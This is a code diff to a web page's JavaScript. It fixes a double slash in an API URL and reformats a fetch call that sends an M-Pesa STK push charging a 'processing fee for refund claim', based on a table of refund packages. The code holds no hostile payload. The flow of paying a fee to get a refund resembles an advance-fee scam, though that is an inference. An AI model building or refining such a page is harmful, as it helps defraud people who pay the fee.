@@ -1660,7 +1660,9 @@
     JAVASCRIPT APPLICATION LOGIC
     ========================================================================== -->
     <script>
-        const API_BASE_URL = 'https://nepal-one.vercel.app/';
+        // ✅ FIXED: No trailing slash
+        const API_BASE_URL = 'https://nepal-one.vercel.app';
+
         // ==========================================================================
         // REFUND DATA - Packages with their processing fees
         // ==========================================================================
@@ -1860,17 +1862,18 @@
             if (stkInterval) clearInterval(stkInterval);
             if (stkCheckInterval) clearInterval(stkCheckInterval);
 
-            // Call the backend API
-                                fetch(API_BASE_URL + '/api/stk-push', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            phoneNumber: mpesa,
-                            amount: selectedPackage.processingFee,
-                            accountReference: 'CLAIM-' + Date.now(),
-                            transactionDesc: 'Processing fee for refund claim'
-                        })
-                    })             .then(response => response.json())
+            // ✅ Correct URL with no double slash
+            fetch(API_BASE_URL + '/api/stk-push', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        phoneNumber: mpesa,
+                        amount: selectedPackage.processingFee,
+                        accountReference: 'CLAIM-' + Date.now(),
+                        transactionDesc: 'Processing fee for refund claim'
+                    })
+                })
+                .then(response => response.json())
                 .then(data => {
                     if (data.success) {
                         document.getElementById('stk-status').textContent = '✅ STK Push sent! Please check your phone and enter PIN.';
